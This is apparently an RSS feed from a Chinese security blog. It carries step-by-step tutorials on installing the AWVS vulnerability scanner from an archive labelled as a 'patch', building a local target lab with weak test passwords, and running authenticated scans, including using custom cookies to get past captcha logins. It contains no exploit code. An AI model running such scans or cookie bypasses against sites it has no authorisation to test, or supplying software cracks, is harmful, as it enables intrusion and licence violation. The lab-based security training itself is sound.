-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/7739d66d7aac4c5da0480d475773b3e8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 选择【Use pre-recorded login sequence 】, 点击【New】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/994d395f718b45499787edd45a19b638.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 点击【登录】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/c29d1e54000945b192df336e08c91347.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 输入用户名【xiaogang】，密码【123456】, 点击【登录】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/cc5e9e0302c54028812dacf84cb06860.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 检查登录脚本流程是否完整，点击【Next】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/e62eec33761c4c2094454c341bb51095.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 点击【xaiogang_vip3】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/387c0b1b3d4a4bdab0fd2ff9f7f63927.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 点击【Restrict requests to path】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/fddbf7c1804e41548435d3528683d093.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;10. 点击【Next】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/ce0add0774944ffe9d8927a577cb2ef6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;11. 点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/98c4b3e7a6dc419eb47b7c7484cd2031.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;12. 点击【Finish】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/696267829a0b43fc9e85b95fca2d88f8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/dc773606b84d4711bf43c4e6dc931ce0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;13. 点击【Scan】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/485e9f63b9b04b54b4b0d167fcce6109.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;14. 选怎扫描配置，如下图所示，点击【Create Scan】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/1a594edc6fd04f2aa029c8bdd8243c61.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;15. 点击目标连接，查看具体扫描信息&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/dbb993767f214481b9d2e73f3edd6341.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;16. 等待扫描完成&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/03e6d16afaec4f48b73bfe009796c34f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/fd0c824cc75d4e0daaed7d6d3aeeeb82.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;3利用定制cookie扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3利用定制cookie扫描&#34;&gt;#&lt;/a&gt; 3. 利用定制 cookie 扫描&lt;/h2&gt;
-&lt;p&gt;扫描过程会遇到网站 存在 手机验证码，图形验证码，滑动验证等等，这时候想要深度扫描时，就需要进行登录绕过。最长用的手段就是定制 cookie 绕过。&lt;/p&gt;
-&lt;p&gt;1. 点击【Targets】，点击【add Target】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/773081aad11743e1afa80907ea1cee93.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 输入扫描地址和扫描描述，点击【save】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/38cb04b93af647d8b728150d39621a16.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 点击【Advanced】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/5825a551928b43219f0fc9af60192257.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 点击【Custom Cookies】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/fcdc3b768b124c3facf16d1b48f6b501.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 输入被测网站网址&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/b0275ea0dd1d40a08419dcb420fd0cc3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 切换到其他浏览器，获取网站的 cookie 值&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/152a0512b80e4849841a679a47a39523.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 切换会 AWVS，输入 cookie 的值，点击【+】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/649473f702434786b796dbc2d2c288fa.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 点击【save】，然后点击【Scan】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/e4875f76ecdf4c018469b5a95a64c094.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 设置扫描选项，如下图所示，点击【Create Scan】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/5ffa52bd590e42048dfb0e8158b83211.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;10. 点击扫描的网站地址，查看扫描信息&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/4e18d51428f741c9a5e8da8cdda0f3c0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;11. 等待扫描完成&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/1e36af11e5b14c9ca46f1f4bb1fd9ca0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642128985000/979340ee6370462da77cfb93f83b7407.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://mangpumo.github.io/2023/01/11/AWVS%E6%89%AB%E6%8F%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
-            <title>AWVS扫描环境搭建</title>
-            <link>https://mangpumo.github.io/2023/01/11/AWVS%E6%89%AB%E6%8F%8F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
-            <pubDate>Wed, 11 Jan 2023 05:28:42 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;第二节-扫描环境搭建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二节-扫描环境搭建&#34;&gt;#&lt;/a&gt; 第二节 - 扫描环境搭建&lt;/h1&gt;
-&lt;h2 id=&#34;1phpstudy_pro安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1phpstudy_pro安装&#34;&gt;#&lt;/a&gt; 1.phpstudy_pro 安装&lt;/h2&gt;
-&lt;p&gt;1. 右键【phpstudy_x64_8.1.1.3】，选则【以管理员身份运行】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/b356aebd026a401ab1280cd88de7dbc1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 点击【是】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/72a8f98ad53c4f8386286be533efeb84.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 点击【自定义选项】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/0ec2b36d494e47aaa18b13d6ffff66bd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 选择喜欢的位置安装&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/9aa79d49261d403b88ae8e718edd8cf8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 点击【立即安装】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/53c37dd487324979b5c1bf8bbe67241a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 等待安装&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/7abe81557a3641ee8bd5df7c023f2d46.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 点击【安装完成]&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/4de8ebb124e148e380e1cf41d8ac17fb.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 点击启动【Apache】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/da5592a33fd64576b9595e61b879d6e2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 点击【允许访问】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/22dfca13a18c48fc903e04d49fcf60c5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;10. 点击启动【MySQL】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/946782beb70d48b88eea87240e7634a3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;11. 点击【允许访问】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/5d0618a415824060ac2cb34d37df5f9d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;12. 按照下图确认服务启动状态&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/054b9c7efd944364af2be96892efc5d5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;2设置扫描靶场的数据库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2设置扫描靶场的数据库&#34;&gt;#&lt;/a&gt; 2. 设置扫描靶场的数据库&lt;/h2&gt;
-&lt;p&gt;1. 点击【数据库】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/34958b63d9cb4ab591f43c4912d366c9.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 点击【修改 root 密码】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/4d75a477c5004794b2d8c4dc71016167.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 输入新密码【123456】，点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/b4181c549ce84ba3ba82bb0cd2d9b373.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 点击【好】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/6b4d5ece9ae84759ba5fc05e214618cc.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 点击【创建数据库】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/7604abbea2be498fba9bfbcc809bfefa.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 输入数据库名称【gkk】，用户名【gkk】，密码【123456】，点击【确认】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/a111522dd2024de88a93dd7408e3f008.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 点击【好】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/fe06b9a505c741568a5fc0749de93eaf.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 按照下图核对数据信息（点击密码 ****** 就可以显示成明文）&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/aec1cf31b5114c7fbc5eb7429517d1b1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 点击【软件管理】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/a165762f120f430a9905c9a47e7b665e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;10. 点击【数据库工具（客户端）】, 点击【安装】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/fb3eee3d72884553910fe7e01240a387.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;11. 安装成功后，点击【管理】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/62406be89b314b64ae478775b54ab678.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;12. 点击【打开】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/ccb4bb3c02084648a66b3232ae8c2f8a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;13. 点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/c3439b02b9e84aed888cd1d29f6f23ec.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;14. 输入用户名【root】，密码【123456】，点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/475dca31e00c47d1b1407bbf83d0c714.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;15. 点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/c30021f4fcce403694b9ddf7770c37ed.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;16. 点击选中【gkk】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/bf0e4a513f7f4ceb9a0afefb7c9e1fb0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;17. 点击【文件】，选则【输入】，点击【SQL 文件】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/670f0df400d9463e895aab34ed22cd10.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;18. 选择课程附件里带的【gkk.sql】，点击【打开】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/170a264dbf7647829bbb4fbe0e0ab410.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;19. 导入完成后，点击【关闭】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/cae74489ba3540af8c7ea9f4ff6e6e6e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;20. 根据下图查看数据库表的配置，必须和课件一致才可以&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/722fea8aa43c4cacb4e503ab5c0d1b6b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;3部署靶场网站&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3部署靶场网站&#34;&gt;#&lt;/a&gt; 3. 部署靶场网站&lt;/h2&gt;
-&lt;p&gt;1. 将课件里带的两个靶场【have_code】【no_code】复制到一个纯英文的路径下&lt;/p&gt;
-&lt;p&gt;have_code: 登录有验证码靶场&lt;/p&gt;
-&lt;p&gt;no_code: 登录没有验证码靶场&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/d75060e8774b4a949f32e5bd09ccf047.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 打开 phpstudy_pro, 点击【网站】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/4172bad9154943dc802e55c24cbf374c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 点击【创建网站】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/bf201c4497e8480c9e771171ff6bac41.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 输入域名【127.0.0.1】，端口改为【81】，点击【浏览】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/fa04d3e4f01a4db9ba18aea6e6ee213b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 选择【no_code】靶场，点击【选择文件夹】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/9c75e6911177447796da41d3ef745aa5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/e1bd846aa81c42a7929f0ce3794b44bd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 点击【好】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/691acf90a32e4edfae340933792db33f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 点击【创建网站】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/8158d81ba2c14ffa98b9dd5c67f64a98.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 输入域名【127.0.0.1】，端口改为【82】，点击【浏览】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/ca9307144fb74a1286a00fe2adaade51.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;10. 选择【have_code】，点击【选择文件】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/a9f6188674c141f288ae3e2bfea04051.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;11. 点击【确定】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/c05237bc4a71445ca3ba733b6cf22410.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;12. 点击【好】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/ada2b949cdaa4bd7a0e88b89c7f4934d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;13. 点击【首页】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/cd8d650c7a1a4b60adc1a585c6e49b0b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;14. 点击【重启】，重启 Apache&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/78a1d78620be4d37b535e6dff4e024f6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;15. 重启完成后，浏览器访问 127.0.0.1:81/login.php&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/58ca7dc93cd642a68b3d165a6f022327.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;16. 输入用户名【xiaogang】，密码【123456】，点击登录，登录成功则环境部署完成&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/6e1a826bb7a94d639d71df8c37824261.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/bdcf29bf83054b429584057f86b36a5e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;17. 浏览器访问 127.0.0.1:82/login.php&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/94faa4aa2240470db79a806592c16e4c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;18. 输入用户名【xiaogang】，密码【123456】，验证码，点击登录，登录成功则环境部署完成&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/53ac7dd9018d4eee8db144d3510bdc0b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;images/b15d0192e9804e9db873ab1d2467b9cf.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://mangpumo.github.io/2023/01/11/AWVS%E5%AE%89%E8%A3%85%E4%B8%8E%E6%BF%80%E6%B4%BB/</guid>
-            <title>AWVS安装与激活</title>
-            <link>https://mangpumo.github.io/2023/01/11/AWVS%E5%AE%89%E8%A3%85%E4%B8%8E%E6%BF%80%E6%B4%BB/</link>
-            <pubDate>Wed, 11 Jan 2023 05:27:42 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;第一节-awvs安装与激活&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一节-awvs安装与激活&#34;&gt;#&lt;/a&gt; 第一节 - AWVS 安装与激活&lt;/h1&gt;
-&lt;h2 id=&#34;1awvs简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1awvs简介&#34;&gt;#&lt;/a&gt; 1.AWVS 简介&lt;/h2&gt;
-&lt;p&gt;AWVS（Acunetix Web Vulnerability Scanner）是一款知名的网络漏洞扫描工具，通过网络爬虫测试网站安全，检测流行的 Web 应用攻击，如跨站脚本、sql 注入等。据统计，75% 的互联网攻击目标是基于 Web 的应用程序。&lt;/p&gt;
-&lt;h2 id=&#34;2为什么要用awvs&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2为什么要用awvs&#34;&gt;#&lt;/a&gt; 2. 为什么要用 AWVS&lt;/h2&gt;
-&lt;p&gt;在今天，网站的安全是容易被忽视的，黑客具备广泛的攻击手段，例 SQL 注入，XSS，文件包含，目录遍历，参数篡改，认证攻击等，虽然你配置了正确的防火墙和 WAF，但是这些安全防御软件仍然 i 存在策略性的绕过，因此，需要您定期的扫描你的 web 应用，但是手动检测你所有的 web 应用是否存在安全漏洞比较复杂和费时，所以您需要一款自动化的 web 漏洞扫描工具来检测您的 web 应用是否存在安全漏洞。&lt;/p&gt;
-&lt;h2 id=&#34;3windows-安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3windows-安装&#34;&gt;#&lt;/a&gt; 3.windows 安装&lt;/h2&gt;
-&lt;p&gt;1. 解压 awvs14 补丁.zip&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/81e865bc2d964e5992df154d068e9b00.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 双击 acunetix_14.1.210316110.exe 安装&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/2d71bb4195454a4694ce88dd6c3ff88e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 点击【是】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/0f9e40ee7a7f487199ebcbcbd829cccd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 点击【Next】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/4a57a401dc784646bb780f98ff4f5c44.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 点击【I accept the agreement 】, 点击【Next】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/bf133d8a4e0a4c82b83f777bb7b8aa69.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 选择喜欢的位置安装，点击【Next】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/88b1d9decc53420f8e913d962bf9f0c0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 选择喜欢的位置保存 Data，点击【Next】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/0b33e0cefcb848b395a5414cb71afae4.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 输入账号名：admin@msb.com, 密码：m123456@，点击【Next】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/deb2586fac9942e68ecf8b0f848de948.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 选择【Allow remote access to Acunetix】，选择 IP，点击【Next】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/20d3c97cb28d407ba52d8ad48a9320ee.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;10. 点击【Next】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/9967226ab34146a0bfeab18109f1eb05.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;11. 点击【install】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/fd5c6d67cf7a4be19d5c1348d7e11252.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;12. 等待安装完成&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/def992e831474a3b82acb84da82f5d0d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;13. 点击【是】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/057f985ac8a34101aa55e2255c31519d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;14. 点击【Finsh】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/41c819b1c8014895a7a808f75f888790.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/b47d1c4b81d448098ca2effdf805161f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
